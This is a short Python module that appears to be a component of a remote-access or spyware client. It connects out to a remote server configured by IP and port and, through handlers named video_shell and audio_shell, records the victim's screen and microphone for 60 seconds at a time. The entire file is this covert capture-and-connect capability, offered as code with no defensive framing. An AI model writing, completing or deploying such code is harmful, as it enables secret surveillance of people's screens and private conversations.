import socket
from lib import audio, client, config, video


# =====================
# Screen Capturer
# =====================
def video_shell(server: socket.socket):
    video.record(60)


# =====================
# Microphone Audio Recorder
# =====================
def audio_shell(server: socket.socket):
    audio.record(60)


def connect_video_server():
    video_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect_server(video_server, (config.IP, config.VDO_PORT), video_shell, 5)


def connect_audio_server():
    audio_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect_server(audio_server, (config.IP, config.AUD_PORT), audio_shell, 5)
